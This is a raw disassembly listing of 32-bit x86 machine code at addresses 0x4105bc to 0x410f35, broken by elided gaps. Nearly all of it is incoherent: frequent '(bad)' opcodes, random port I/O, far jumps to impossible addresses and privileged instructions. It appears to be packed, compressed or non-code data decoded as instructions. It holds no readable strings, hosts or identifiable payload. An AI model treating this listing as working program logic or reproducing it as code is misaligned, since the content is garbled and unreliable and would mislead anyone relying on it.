  4105bc:	dec    ebp
  4105bd:	pop    eax
  4105be:	ret    
  4105bf:	add    al,0xa0
  4105c1:	data16 (bad) 
  4105c3:	je     0x41055f
  4105c5:	outs   dx,BYTE PTR ds:[esi]
  4105c6:	(bad)  
  4105c7:	mov    dh,0x91
  4105c9:	in     al,dx
  4105ca:	xadd   DWORD PTR [esp-0x5b4a5901],ebx
  4105d2:	iret   
  4105d3:	xchg   esi,eax
  4105d4:	xchg   ecx,eax
  4105d5:	call   DWORD PTR [edx+ebx*2]
  4105d9:	fadd   DWORD PTR [eax]
  4105db:	jmp    0xfd3fa971
  4105e0:	dec    edx
  4105e1:	pop    eax
  4105e2:	imul   edi,DWORD PTR [ecx+edx*2-0x75c3019a],0x616efe6e
  4105ed:	lods   al,BYTE PTR ds:[esi]
  4105ee:	rcr    DWORD PTR [esi+0x61],cl
  4105f1:	data16 (bad) 
  4105f3:	aam    0x2a
  4105f5:	pop    eax
  4105f6:	mov    edx,DWORD PTR [eax+edx*2]
  4105f9:	data16 (bad) 
  4105fb:	aam    0x4a
  4105fd:	gs mov ah,0x21
  410600:	sub    DWORD PTR [esi-0x2],esp
  410603:	ds xchg edi,eax
  410605:	std    
  410606:	out    0x1,eax
	...
  41061c:	adc    esp,DWORD PTR [esi-0x2]
  41061f:	cs out 0x4d,eax
  410622:	mul    BYTE PTR [esi]
  410624:	and    DWORD PTR [ebp-0x50],ebx
  410627:	test   eax,0x5cfe6611
  41062c:	or     ch,BYTE PTR [esi-0x2]
  41062f:	push   cs
  410630:	adc    bl,BYTE PTR [ebx-0x27c8ffc1]
  410636:	std    
  410637:	mov    ch,0x34
  410639:	lock std 
  41063b:	(bad)  
  41063c:	cmp    BYTE PTR [esi+edi*1-0x1],dh
  410640:	fnsave [bp+di+0x6fe8]
  410645:	(bad)  
  410647:	call   0x3e420c
  41064c:	scas   eax,DWORD PTR es:[di]
  41064e:	loop   0x410647
  410650:	pop    es
  410651:	fucom  st(6)
  410653:	test   DWORD PTR [eax-0x23],esp
  410656:	std    
  410657:	jmp    FWORD PTR [ebp-0x18000a24]
  41065d:	ret    
  41065e:	js     0x4106a0
  410660:	out    0xdc,eax
  410662:	std    
  410663:	mov    ch,0xcc
  410665:	aam    0xfd
  410667:	jmp    FWORD PTR [eax-0x5800c1b4]
  41066d:	fadd   QWORD PTR [ebx-0x8]
  410670:	mov    ecx,0xb7fffbd9
  410675:	fdiv   QWORD PTR [ebx-0x4]
  410678:	enter  0x1092,0x0
  41067c:	shl    BYTE PTR [ebx],1
  41067e:	ror    DWORD PTR [eax+eax*1],0x0
	...
  410692:	add    BYTE PTR [eax],al
  410694:	loopne 0x4106e5
  410696:	mov    esp,ebp
  410698:	arpl   ax,ax
  41069a:	cli    
  41069b:	push   0xffffffd0
  41069d:	inc    esi
  41069e:	dec    ebx
  41069f:	(bad)  
  4106a0:	(bad)  [eax-0x1a]
  4106a3:	add    DWORD PTR [ebp-0x23],0xdcdd89fd
  4106aa:	std    
  4106ab:	jne    0x410655
  4106ad:	dec    eax
  4106ae:	mov    cl,0x48
  4106b0:	rol    DWORD PTR [eax],1
  4106b2:	push   DWORD PTR ds:0x4103cd
  4106b8:	sub    BYTE PTR [ebp-0x5],bh
  4106bb:	jmp    DWORD PTR [edi]
  4106bd:	fnsave [ebx+0x8]
  4106c0:	cmp    DWORD PTR [edi-0x4f],edi
  4106c3:	inc    edi
  4106c4:	clc    
  4106c5:	push   esi
  4106c6:	fiadd  DWORD PTR [ecx]
  4106c8:	cmp    DWORD PTR [edi-0x7e],edx
  4106cb:	out    0xb4,eax
  4106cd:	arpl   WORD PTR [ebp-0x2],sp
  4106d0:	pop    esi
  4106d1:	jecxz  0x410739
  4106d3:	dec    ah
  4106d5:	pop    esi
  4106d6:	pop    edx
  4106d7:	xchg   ebx,eax
  4106d8:	or     al,0x5e
  4106da:	gs enter 0x5a7b,0x2
  4106df:	push   ebp
  4106e0:	mov    dl,0x3a
  4106e2:	add    ebx,0x69cf2c35
  4106e8:	cmp    edi,ecx
  4106ea:	mov    ch,0xfe
  4106ec:	lods   al,BYTE PTR ds:[esi]
  4106ed:	jno    0x410749
  4106ef:	xor    eax,0x8865aa5c
  4106f4:	jl     0x41068b
  4106f6:	jns    0x41072c
	...
  41070c:	mov    edi,0xb3ffc351
  410711:	inc    esp
  410712:	nop
  410713:	daa    
  410714:	js     0x41076f
  410716:	cmp    BYTE PTR [esi],0x39
  410719:	or     eax,0x307f67c1
  41071e:	(bad)  
  410721:	xchg   ecx,eax
  410722:	jmp    0xf99a4038
  410727:	mov    edi,0xe7cc324d
  41072c:	scas   eax,DWORD PTR es:[edi]
  41072d:	mov    al,0x65
  41072f:	(bad)  
  410730:	imul   edx,DWORD PTR [ecx+0x2],0xda8bce00
  410737:	push   esi
  410738:	add    BYTE PTR [eax-0x5b51affe],bl
  41073e:	cli    
  41073f:	out    0xc9,eax
  410741:	cmp    eax,0xed91fe65
  410746:	and    eax,0x3be96ff
  41074b:	inc    esi
  41074c:	mov    ecx,0xc03e700
  410751:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410753:	addr16 dec ebx
  410755:	inc    eax
  410756:	dec    edi
  410757:	data16 ja 0x4107bd
  41075a:	or     eax,0xee289c71
  41075f:	lock mov ds:0x5f677363,eax
  410765:	in     eax,dx
  410766:	loopne 0x4107c3
  410768:	cs and eax,0xc1ef65ee
  41076e:	scas   eax,DWORD PTR es:[edi]
  41076f:	inc    edx
	...
  410784:	cmp    al,BYTE PTR [eax]
  410786:	xor    al,0x79
  410788:	push   edx
  410789:	jg     0x410737
  41078b:	push   0xb54300a0
  410790:	das    
  410791:	in     eax,dx
  410792:	lock pop ebx
  410794:	loopne 0x4107b9
  410796:	mov    esi,0xb4bcb165
  41079b:	ficom  DWORD PTR [esi]
  41079d:	(bad)  [ebx+edi*4+0x79]
  4107a1:	add    BYTE PTR [ecx],dl
  4107a3:	loopne 0x410816
  4107a5:	shr    eax,0x64
  4107a8:	inc    ebp
  4107a9:	in     eax,dx
  4107aa:	mov    edi,0x685af6c2
  4107af:	ret    0x62ef
  4107b2:	icebp  
  4107b3:	inc    ebx
  4107b4:	push   0x9
  4107b6:	sbb    esp,ebx
  4107b8:	fisub  WORD PTR [edx-0x7b]
  4107bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107bc:	pop    esi
  4107bd:	lea    ebx,[edi]
  4107bf:	ret    
  4107c0:	into   
  4107c1:	mov    dl,0x65
  4107c3:	out    dx,eax
  4107c4:	ds pop eax
  4107c6:	std    
  4107c7:	fistp  QWORD PTR [edi+0x77b94062]
  4107cd:	arpl   WORD PTR [ebp-0x24],cx
  4107d0:	scas   al,BYTE PTR es:[edi]
  4107d1:	bound  edx,QWORD PTR [ebp-0x5a]
  4107d4:	push   ds
  4107d5:	lea    ebp,[edi-0x25613e]
  4107db:	sar    BYTE PTR fs:[edi-0x561d201],cl
  4107e2:	out    0xb7,eax
  4107e4:	popaw  
  4107e6:	(bad)  
  4107e7:	push   ds
	...
  4107fc:	mov    fs,WORD PTR [esi-0x2]
  4107ff:	pushf  
  410800:	jb     0x41085c
  410802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410803:	int    0xd5
  410805:	popa   
  410806:	enter  0x392b,0x0
  41080a:	push   ebp
  41080b:	jb     0x41080e
  41080d:	jle    0x4107d2
  41080f:	cmc    
  410810:	test   cl,cl
  410812:	imul   ebp,ecx,0x5cfeb270
  410818:	inc    ebp
  410819:	pop    edx
  41081a:	dec    eax
  41081b:	sbb    eax,0x2c8861d4
  410820:	mov    eax,ds:0x525f3476
  410825:	mov    edi,0x8e5f71ff
  41082a:	daa    
  41082b:	sub    BYTE PTR ds:0x26e93e80,dh
  410831:	mov    ebp,0xc0d38567
  410836:	(bad)  
  410837:	cmp    eax,0xe9107365
  41083c:	cmp    dh,ch
  41083e:	mov    edi,0xe7ca3c1d
  410843:	pop    eax
  410844:	mov    dl,0x62
  410846:	(bad)  
  410847:	sbb    DWORD PTR ds:0x948efe62,eax
  41084d:	fldcw  WORD PTR [ebp+0x4e61fa20]
  410853:	outs   dx,BYTE PTR ds:[esi]
  410854:	(bad)  
  410856:	out    0x8a,eax
  410858:	fldenv [edx-0x2]
  41085b:	push   ecx
  41085c:	add    eax,0x56ff23
	...
  410871:	add    BYTE PTR [eax],al
  410873:	add    BYTE PTR [ecx],dl
  410875:	add    BYTE PTR [esi+0x69],al
  410878:	push   esp
  410879:	add    BYTE PTR [ebp+0x0],dh
  41087c:	cli    
  41087d:	mov    ds:0x965033fa,al
  410882:	std    
  410883:	dec    DWORD PTR [edi-0x24]
  410886:	lock scas al,BYTE PTR es:[edi]
  410888:	mov    BYTE PTR [ebx+esi*2-0x45],ah
  41088c:	pop    edi
  41088d:	push   edx
  41088e:	cli    
  41088f:	jmp    DWORD PTR [ebp-0x73d4199b]
  410895:	fdiv   st(5),st
  410897:	pop    edi
  410898:	sahf   
  410899:	rol    DWORD PTR es:[eax+edx*2],0x32
  41089e:	mov    esp,ebp
  4108a0:	shl    DWORD PTR [eax],cl
  4108a2:	sti    
  4108a3:	push   esi
  4108a4:	mov    bh,0x47
  4108a6:	(bad)  
  4108a7:	imul   esi,DWORD PTR [ecx+0x680873dc],0x5fff39b1
  4108b1:	jae    0x4108f6
  4108b3:	cld    
  4108b4:	fwait
  4108b5:	pop    es
  4108b6:	mov    gs,WORD PTR [eax]
  4108b8:	popa   
  4108b9:	cld    
  4108ba:	mov    bh,BYTE PTR ds:0x411482
  4108c0:	nop
  4108c1:	sbb    eax,0x54657400
  4108c6:	mov    eax,0x56fc6149
  4108cb:	call   0x3f74d0
  4108d0:	or     edi,DWORD PTR [ebp-0x2bc9e08e]
  4108d6:	xor    DWORD PTR [eax+0x0],ecx
	...
  4108e9:	add    BYTE PTR [eax],al
  4108eb:	add    BYTE PTR [edi-0x2f97b124],bh
  4108f1:	cld    
  4108f2:	out    dx,al
  4108f3:	mov    esi,0x4147d048
  4108f8:	loopne 0x4108a6
  4108fa:	std    
  4108fb:	jne    0x4108d5
  4108fd:	aam    0x23
  4108ff:	arpl   WORD PTR [edi-0x23],bx
  410902:	out    0x51,al
  410904:	push   ds
  410905:	(bad)  
  410907:	jmp    0x410942
  410909:	pop    eax
  41090a:	enter  0x6f7f,0x57
  41090e:	xlat   BYTE PTR ds:[ebx]
  41090f:	stc    
  410910:	(bad)  
  410911:	mov    edx,0x21e0c016
  410916:	arpl   si,di
  410918:	xchg   esi,eax
  410919:	and    al,0xb2
  41091b:	aaa    
  41091c:	lods   al,BYTE PTR ss:[esi]
  41091e:	popf   
  41091f:	dec    BYTE PTR [ebx+ebx*1]
  410922:	arpl   WORD PTR [ecx+esi*1+0xf],si
  410926:	mov    cl,0x3a
  410928:	jbe    0x410933
  41092a:	ret    
  41092b:	pop    ebp
  41092c:	adc    BYTE PTR [eax+ecx*1],0x0
  410930:	or     al,0xee
  410932:	outs   dx,DWORD PTR ds:[esi]
  410933:	xor    BYTE PTR [ebp+0x62],0xec
  410937:	jmp    eax
  410939:	test   BYTE PTR [ecx+0x74],ah
  41093c:	inc    ecx
  41093d:	call   edx
  41093f:	cmp    al,BYTE PTR [esi+0x59]
  410942:	mov    eax,DWORD PTR [ebp+edi*1-0x32]
  410946:	cmp    cl,BYTE PTR [eax+0x78]
  410949:	imul   esp,DWORD PTR [ecx+0x74],0xdfd04141
	...
  410964:	es inc edi
  410966:	popa   
  410967:	je     0x410986
  410969:	lahf   
  41096a:	xlat   BYTE PTR ds:[ebx]
  41096b:	pop    es
  41096c:	and    DWORD PTR [edi+ebx*1],edx
  41096f:	dec    DWORD PTR [esi]
  410971:	mov    eax,ds:0x1c390344
  410976:	(bad)  
  410977:	jmp    0x410933
  410979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41097a:	pop    esi
  41097b:	push   esi
  41097c:	popa   
  41097d:	mov    al,ds:0x71393f3c
  410982:	aam    0x0
  410984:	cli    
  410985:	xchg   BYTE PTR [ecx+0x44],cl
  410988:	(bad)  [ecx+0x2]
  41098b:	add    BYTE PTR [ecx],bh
  41098d:	push   ss
  41098e:	jb     0x4109d8
  410990:	js     0x4109fb
  410992:	popa   
  410993:	je     0x4109c6
  410995:	add    BYTE PTR [esi+0x8],dh
  410998:	jp     0x410965
  41099a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41099b:	add    ebx,DWORD PTR ds:0x390418a1
  4109a1:	add    BYTE PTR [ecx-0x25],ch
  4109a4:	cmp    BYTE PTR [eax],al
  4109a6:	mov    ebp,0xf0d59e0b
  4109ab:	imul   esp,DWORD PTR [ebx+0x15],0x36
  4109af:	bound  esp,QWORD PTR [ecx+0x3903e898]
  4109b5:	push   0x5f7fcac4
  4109ba:	sbb    eax,0x6683ed8
  4109bf:	sbb    al,0x6e
  4109c1:	pop    edi
  4109c2:	dec    ecx
  4109c3:	and    dh,dl
  4109c5:	shr    al,0xe7
	...
  4109dc:	pop    edi
  4109dd:	adc    eax,0x3903e9
  4109e2:	bound  eax,QWORD PTR [edi-0x26]
  4109e5:	pop    esi
  4109e6:	mov    bl,0x3
  4109e8:	cmp    DWORD PTR [eax],eax
  4109ea:	jmp    0x8428f8a5
  4109ef:	cmp    eax,0xc2410076
  4109f4:	adc    eax,eax
  4109f6:	call   0xbcaa4ae
  4109fb:	add    al,0x39
  4109fd:	add    cl,ch
  4109ff:	pusha  
  410a00:	lea    ecx,[eax]
  410a02:	mov    dh,0xf9
  410a04:	mov    ecx,0x46c4021e
  410a09:	add    BYTE PTR ds:0xf857ba01,bl
  410a0f:	xlat   BYTE PTR ds:[ebx]
  410a10:	inc    ecx
  410a11:	inc    edi
  410a12:	sub    esp,DWORD PTR [eax+0x39]
  410a15:	add    cl,ch
  410a17:	add    edx,edx
  410a19:	lock test DWORD PTR [edi],edx
  410a1c:	push   ds
  410a1d:	retf   
  410a1e:	daa    
  410a1f:	add    al,0xd6
  410a21:	adc    al,0x0
  410a23:	sub    bh,ah
  410a25:	mov    edi,0x158480ff
  410a2a:	jmp    DWORD PTR [esi-0x4c]
  410a2d:	inc    edx
  410a2e:	pop    ss
  410a2f:	push   edx
  410a30:	xor    BYTE PTR [ebx-0x4c43ba76],0xb
  410a37:	bound  edi,QWORD PTR [esi+0xe]
  410a3a:	(bad)  
  410a3b:	mov    ebx,0x817f8f32
	...
  410a54:	cmp    eax,0x67360000
  410a59:	or     cl,BYTE PTR [edi-0x1a10e97]
  410a5f:	jmp    0x6e50db7d
  410a64:	mov    ebp,0x3ae8ff92
  410a69:	cmp    DWORD PTR [edx+ebp*4],0x75
  410a6d:	mov    edi,0xef86e8ff
  410a72:	(bad)  
  410a73:	mov    ah,0x19
  410a75:	retf   
  410a76:	inc    eax
  410a77:	jmp    0xa2841e55
  410a7c:	jnp    0x410adc
  410a7e:	out    0x1,al
  410a80:	and    BYTE PTR [edi-0x2],bl
  410a83:	mov    eax,ds:0xe900003a
  410a88:	out    dx,eax
  410a89:	aas    
  410a8a:	and    ebp,ecx
  410a8c:	push   ds
  410a8d:	pop    DWORD PTR [ecx+ebp*8]
  410a90:	cmp    al,BYTE PTR [eax]
  410a92:	add    BYTE PTR [edx-0x7f],ch
  410a95:	add    DWORD PTR [ebx-0x7af2c50a],eax
  410a9b:	out    dx,al
  410a9c:	cdq    
  410a9d:	pop    esi
  410a9e:	(bad)  
  410a9f:	jb     0x410a98
  410aa1:	pop    ecx
  410aa2:	pop    esi
  410aa3:	mov    al,0x7c
  410aa5:	add    DWORD PTR [eax],eax
  410aa7:	aas    
  410aa8:	fisttp QWORD PTR [edx-0x26]
  410aab:	sub    DWORD PTR ds:0xd1007158,edi
  410ab1:	(bad)  
  410ab2:	std    
  410ab3:	mov    ecx,DWORD PTR [ecx+0x8bf62c]
	...
  410ac9:	add    BYTE PTR [eax],al
  410acb:	add    BYTE PTR [ecx-0x1d578197],bl
  410ad1:	add    cl,BYTE PTR [ebx-0x38730937]
  410ad7:	jmp    0x410b11
  410ad9:	mov    eax,edi
  410adb:	add    ebx,DWORD PTR [esi-0x74]
  410ade:	(bad)  
  410adf:	push   eax
  410ae0:	sbb    ecx,edx
  410ae2:	out    0xa7,al
  410ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae5:	add    DWORD PTR [eax],eax
  410ae7:	mov    ecx,DWORD PTR [ecx-0x67]
  410aea:	mov    ecx,ecx
  410aec:	mov    ds:0xa6c989c3,eax
  410af1:	or     al,0xf6
  410af3:	jne    0x410b21
  410af5:	aas    
  410af6:	rcl    DWORD PTR [ebp-0x15],0xec
  410afa:	data16 or BYTE PTR [ecx+eax*2],ah
  410afe:	(bad)  
  410aff:	test   edx,0xebffc302
  410b05:	inc    ebp
  410b06:	push   es
  410b07:	or     esp,DWORD PTR [eax]
  410b09:	xor    eax,0xdf5deb0a
  410b0e:	push   es
  410b0f:	(bad)  
  410b10:	pop    eax
  410b11:	inc    ecx
  410b12:	jle    0x410b4c
  410b14:	push   eax
  410b15:	cmp    ah,dh
  410b17:	leave  
  410b18:	loop   0x410b21
  410b1a:	add    BYTE PTR [ebp-0x65],dl
  410b1d:	rol    BYTE PTR [ecx+0x66910cc4],1
  410b23:	xor    ah,dl
  410b25:	inc    ebx
  410b26:	(bad)  
  410b27:	not    DWORD PTR [edx+0x3]
  410b2a:	ret    
  410b2b:	(bad)  
  410b2c:	fild   WORD PTR [esi-0xe]
	...
  410b43:	add    BYTE PTR [eax],dl
  410b45:	add    DWORD PTR [eax],eax
  410b47:	sub    edi,ebx
  410b49:	outs   dx,BYTE PTR ds:[esi]
  410b4a:	inc    ebx
  410b4b:	cld    
  410b4c:	xor    BYTE PTR [ebp+0x7f390873],bh
  410b52:	js     0x410b61
  410b54:	cmp    DWORD PTR [edi-0x79],esp
  410b57:	mov    edi,0x745d9c61
  410b5c:	inc    ecx
  410b5d:	outs   dx,DWORD PTR ds:[esi]
  410b5e:	sub    BYTE PTR [esi+ecx*8],dh
  410b61:	aad    0x8c
  410b63:	inc    esp
  410b64:	shl    DWORD PTR [esi],0xb4
  410b67:	out    0x4d,eax
  410b69:	and    ebx,DWORD PTR [edi-0x2]
  410b6c:	shl    BYTE PTR [ebx-0x4cdb01aa],0x6b
  410b73:	push   ebx
  410b74:	xor    al,0x67
  410b76:	add    cl,BYTE PTR [ebx]
  410b78:	jns    0x410b14
  410b7a:	idiv   dh
  410b7c:	or     al,0xbf
  410b7e:	pop    esi
  410b7f:	je     0x410b06
  410b81:	jbe    0x410bed
  410b83:	xchg   DWORD PTR [ebp+0x2e],eax
  410b86:	pop    edi
  410b87:	inc    BYTE PTR [ebx+eiz*1]
  410b8a:	ins    BYTE PTR es:[edi],dx
  410b8b:	inc    ecx
  410b8c:	inc    esp
  410b8d:	addr16 add bh,bh
  410b90:	in     al,0x5e
  410b92:	push   0xfffffff3
  410b94:	sub    al,0xe
  410b96:	pop    edi
  410b97:	sbb    ah,0x5a
  410b9a:	add    dh,BYTE PTR [edi+esi*1+0x6f]
  410b9e:	mov    ecx,0x5d66f84a
  410ba3:	je     0x410bf2
  410ba5:	(bad)  
  410ba6:	xchg   edx,eax
  410ba7:	or     eax,0x0
	...
  410bbc:	cmp    DWORD PTR [edi+0x9],esp
  410bbf:	shr    BYTE PTR [ebp+0x39009964],0x69
  410bc6:	add    bh,bh
  410bc8:	lods   al,BYTE PTR ds:[esi]
  410bc9:	xor    eax,0x425d056a
  410bce:	pop    ebp
  410bcf:	mov    bh,dl
  410bd1:	push   ds
  410bd2:	dec    ebp
  410bd3:	shl    DWORD PTR ds:0x158ab769,0xc2
  410bda:	popf   
  410bdb:	fstp   TBYTE PTR [ecx+0x0]
  410bde:	jmp    0xaa42743e
  410be3:	pop    esi
  410be4:	out    dx,eax
  410be5:	aad    0xe0
  410be7:	imul   edx,DWORD PTR ds:0x505e8e12,0x8
  410bee:	adc    ecx,eax
  410bf0:	push   ds
  410bf1:	shr    eax,0x5e
  410bf4:	inc    ebp
  410bf5:	or     BYTE PTR [ecx+0x6d5b0edc],al
  410bfb:	jmp    0x2c27f436
  410c00:	clc    
  410c01:	call   FWORD PTR [ebp-0x28]
  410c04:	ss push 0x5ba61bc2
  410c0a:	dec    ebp
  410c0b:	fdiv   DWORD PTR [esi]
  410c0d:	push   0x5b976034
  410c12:	add    BYTE PTR [ecx+edi*1],0x0
  410c16:	jmp    0xe9458467
  410c1b:	mov    eax,0x47696cb3
	...
  410c34:	outs   dx,BYTE PTR ds:[esi]
  410c35:	call   0x6f4d1d
  410c3a:	adc    ecx,edx
  410c3c:	cmp    DWORD PTR [edi],edi
  410c3e:	or     eax,0x60be55e
  410c43:	fdivr  DWORD PTR [esi]
  410c45:	push   0x5b4e1978
  410c4a:	sub    eax,0xe90142c8
  410c4f:	add    edi,DWORD PTR [ecx]
  410c51:	lea    ebp,[ebx]
  410c53:	pop    esp
  410c54:	xchg   al,ch
  410c56:	sub    eax,0xc10079c9
  410c5b:	dec    edx
  410c5c:	jle    0x410cb9
  410c5e:	int    0x9
  410c60:	stc    
  410c61:	ror    DWORD PTR [edx],cl
  410c63:	mov    ah,0xbb
  410c65:	fadd   st(0),st
  410c67:	hlt    
  410c68:	test   edx,esi
  410c6a:	inc    DWORD PTR [edx+0xd]
  410c6d:	retf   
  410c6e:	(bad)  
  410c6f:	xor    al,0x29
  410c71:	push   0x5a95e2db
  410c76:	or     ch,BYTE PTR [ecx+0x2cc70211]
  410c7c:	pop    ecx
  410c7d:	pop    ebx
  410c7e:	(bad)  
  410c7f:	jmp    0xc2a574be
  410c84:	jne    0x410ce0
  410c86:	mov    ah,BYTE PTR [ecx+ebx*2]
  410c89:	dec    eax
  410c8a:	shl    ecx,0x3a
  410c8d:	mov    ch,0x8a
  410c8f:	jge    0x410c19
  410c91:	loop   0x410cf2
  410c93:	inc    esp
  410c94:	jge    0x410cf0
  410c96:	neg    bl
	...
  410cac:	cmp    edi,DWORD PTR [edi]
  410cae:	inc    BYTE PTR [edx]
  410cb0:	pusha  
  410cb1:	pop    edx
  410cb2:	je     0x410c95
  410cb4:	adc    al,dl
  410cb6:	inc    BYTE PTR [esi-0xc]
  410cb9:	add    eax,0x74b6eec0
  410cbe:	(bad)  
  410cbf:	call   0xe1b567fe
  410cc4:	adc    dl,BYTE PTR [edi+0x31]
  410cc7:	es adc al,0x6
  410cca:	rcl    BYTE PTR [edi+esi*1+0x3ae98969],0x0
  410cd2:	call   DWORD PTR [esi+ebp*1-0x1d0e8ba5]
  410cd9:	loope  0x410cd9
  410cdb:	(bad)  
  410cdc:	in     eax,dx
  410cdd:	pop    ecx
  410cde:	je     0x410cc1
  410ce0:	rcl    BYTE PTR [ecx],cl
  410ce2:	cmp    ch,dh
  410ce4:	fld    QWORD PTR ds:0x653b5cc0
  410cea:	jo     0x410cca
  410cec:	pop    es
  410ced:	add    ch,al
  410cef:	mov    al,ds:0xe2fe5942
  410cf4:	jp     0x410cca
  410cf6:	add    DWORD PTR [eax],eax
  410cf8:	jmp    0x410d5a
  410cfa:	std    
  410cfb:	jne    0x410d05
  410cfd:	out    0x1f,al
  410cff:	cmp    edi,ecx
  410d01:	mov    esp,0xfe45c009
  410d06:	jmp    0xe041:0x25924855
  410d0d:	mov    esp,0x873
	...
  410d22:	add    BYTE PTR [eax],al
  410d24:	mov    eax,0xafff3a97
  410d29:	or     al,al
  410d2b:	jne    0x410d0f
  410d2d:	call   0x6070c72
  410d32:	call   0xfdfd95d1
  410d37:	or     edx,DWORD PTR [eax+0x54eb0032]
  410d3d:	mov    ebx,0xaf080873
  410d42:	dec    DWORD PTR ss:[edi]
  410d45:	or     al,al
  410d47:	jne    0x410cdb
  410d49:	call   0x6170c72
  410d4e:	call   0xfdfd9fda
  410d53:	or     DWORD PTR [eax+0x1d],0x77
  410d57:	add    bh,BYTE PTR [ebx]
  410d59:	les    ecx,FWORD PTR [ecx]
  410d5b:	rcl    ah,0x50
  410d5e:	cmp    eax,DWORD PTR [eax]
  410d60:	pusha  
  410d61:	dec    ebp
  410d62:	(bad)  
  410d63:	jb     0x410dc1
  410d65:	js     0x410d66
  410d67:	call   DWORD PTR [eax-0x3]
  410d6a:	jmp    0x60ff:0xfffffb05
  410d71:	mov    cl,al
  410d73:	pop    ebx
  410d74:	sbb    DWORD PTR [edi-0x775afffa],edi
  410d7a:	jmp    0x1800:0x3f164168
  410d81:	xor    bh,bh
  410d83:	ret    0x3239
  410d86:	pop    edx
  410d87:	je     0x410d89
	...
  410d99:	add    BYTE PTR [eax],al
  410d9b:	add    BYTE PTR ds:0x2107d04a,ch
  410da1:	or     DWORD PTR [ebx-0x2],ebx
  410da4:	push   cs
  410da5:	dec    esi
  410da6:	inc    edx
  410da7:	je     0x410dcc
  410da9:	xchg   edx,eax
  410daa:	ror    BYTE PTR [ebx],1
  410dac:	(bad)  
  410dad:	adc    ecx,DWORD PTR [eax+ebp*8]
  410db0:	dec    esi
  410db1:	mov    ds:0xa742fe5a,al
  410db6:	ror    BYTE PTR [edx],1
  410db8:	out    0xfb,al
  410dba:	pop    es
  410dbb:	jmp    DWORD PTR [edi+ebx*2+0x6a]
  410dbf:	pop    es
  410dc0:	(bad)  
  410dc1:	sbb    DWORD PTR [edx-0x38],0x55024efb
  410dc8:	mov    dl,0x82
  410dca:	xchg   bl,al
  410dcc:	aad    0xf5
  410dce:	mov    dl,0x67
  410dd0:	sbb    ecx,eax
  410dd2:	ret    
  410dd3:	jmp    DWORD PTR [esi-0x593cfccc]
  410dd9:	std    
  410dda:	ds out 0x7b,eax
  410ddd:	lea    ebx,[ecx-0x2]
  410de0:	jle    0x410d8d
  410de2:	dec    WORD PTR [esi-0x372fd9a]
  410de9:	ret    0xe7b3
  410dec:	mov    al,0x57
  410dee:	pop    ecx
  410def:	(bad)  
  410df0:	mov    edx,0xe5ff66a3
  410df5:	dec    BYTE PTR [eax+0x6a965544]
  410dfb:	jns    0x410e25
  410dfd:	or     bl,BYTE PTR [ebx-0x7e]
	...
  410e14:	aam    0xf2
  410e16:	add    esi,DWORD PTR [ebp+0x40]
  410e19:	in     al,dx
  410e1a:	shr    bl,0xe9
  410e1d:	(bad)  
  410e1e:	out    dx,al
  410e1f:	xor    BYTE PTR [esi],bh
  410e21:	imul   eax,DWORD PTR [ebp-0x16feda84],0xe886b50a
  410e2b:	add    edi,DWORD PTR [ecx]
  410e2d:	test   DWORD PTR [ebx],ebp
  410e2f:	push   esp
  410e30:	outs   dx,BYTE PTR ds:[esi]
  410e31:	push   edi
  410e32:	push   ebx
  410e33:	push   0x5ac5ea1e
  410e38:	je     0xd5cd12fe
  410e3e:	jne    0x410e25
  410e40:	push   edi
  410e41:	shr    eax,0x6e
  410e44:	xchg   ecx,eax
  410e45:	aas    
  410e46:	sub    esp,DWORD PTR [eax+0x40]
  410e49:	add    cl,ch
  410e4b:	add    edi,esi
  410e4d:	mov    ebp,0x390380
  410e52:	jmp    0x18a98bdf
  410e57:	pop    ebx
  410e58:	inc    ebp
  410e59:	fs adc eax,0x75bacb6c
  410e5f:	pop    edx
  410e60:	xor    eax,DWORD PTR [eax-0xc]
  410e63:	repz mov ebx,0x250350d5
  410e69:	or     bl,BYTE PTR [esi-0x30]
  410e6c:	sahf   
  410e6d:	push   0x579f5911
  410e72:	popa   
  410e73:	cmp    edx,DWORD PTR [edi+0x6b50cd]
	...
  410e89:	add    BYTE PTR [eax],al
  410e8b:	add    BYTE PTR [edi+0x11],bl
  410e8e:	ds pop edx
  410e90:	xor    edi,DWORD PTR [ebx]
  410e92:	mov    ebx,0x44d5bbf0
  410e97:	add    ebp,ebp
  410e99:	push   es
  410e9a:	es enter 0xe85a,0x70
  410e9f:	mul    BYTE PTR [esi+0x57]
  410ea2:	add    BYTE PTR [esi+0x33],dh
  410ea5:	add    cl,ch
  410ea7:	outs   dx,BYTE PTR ds:[esi]
  410ea8:	(bad)  
  410ea9:	imul   esp,edi,0xffffffc2
  410eac:	into   
  410ead:	push   ss
  410eae:	jmp    0x4f83
  410eb3:	push   0xe5740023
  410eb8:	inc    edi
  410eb9:	cmp    esi,DWORD PTR [ebx-0x79]
  410ebc:	cmp    al,0x3b
  410ebe:	jae    0x410eb9
  410ec0:	adc    al,0x7
  410ec2:	lea    ebp,[eax*4+0x41e67c7]
  410ec9:	sar    bh,0xd0
  410ecc:	fnstsw WORD PTR [ebx-0x339f4102]
  410ed2:	jmp    0x410e95
  410ed4:	lea    esp,[edi]
  410ed6:	jmp    FWORD PTR [esi+0x425e41c4]
  410edc:	add    BYTE PTR [edx+0x54],0x72
  410ee0:	push   ecx
  410ee1:	add    bl,0x49
  410ee4:	adc    DWORD PTR [esi-0x2],0x36
  410ee8:	mov    ebx,esi
  410eea:	dec    edi
  410eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eec:	cmc    
  410eed:	push   esi
  410eee:	idiv   bl
	...
  410f04:	cmp    eax,DWORD PTR [ebx-0x2]
  410f07:	ss jp  0x410f28
  410f0a:	inc    ecx
  410f0b:	jmp    0xf64124ca
  410f10:	cs dec edx
  410f12:	add    cl,ch
  410f14:	cmp    al,BYTE PTR [ebp+0x56035d84]
  410f1a:	(bad)  
  410f1b:	mov    ecx,0xa12f5ec9
  410f20:	icebp  
  410f21:	push   ebp
  410f22:	or     ch,BYTE PTR [ecx]
  410f24:	xor    BYTE PTR [ebx+eiz*4-0x18],bh
  410f28:	cmp    al,BYTE PTR [eax]
  410f2a:	sub    DWORD PTR [ecx+ecx*1+0x55],0xfffffffe
  410f2f:	es xor eax,0x3a768407
  410f35:	add    BYTE PTR [eax],al
